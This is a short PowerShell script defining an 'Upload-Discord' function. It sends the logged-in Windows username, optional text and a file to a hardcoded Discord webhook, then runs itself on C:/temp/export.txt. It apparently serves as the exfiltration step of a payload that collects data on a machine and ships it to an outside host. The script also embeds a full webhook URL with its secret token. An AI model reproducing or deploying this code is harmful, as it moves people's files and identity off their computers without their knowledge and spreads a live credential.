function Upload-Discord {

    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )
    
    $hookurl = 'https://discord.com/api/webhooks/1056657372770213939/44sWkeCK7fVTdTjuI8ZYxR4emz_ouq-PmgTcw-f9X1t_3_Frpz1x8M65-9mXooaAHBCQ'
    
    $Body = @{
      'username' = $env:username
      'content' = $text
    }
    
    if (-not ([string]::IsNullOrEmpty($text))){
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
    
    if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
    }
    
    Upload-Discord -file "file:///C:/temp/export.txt"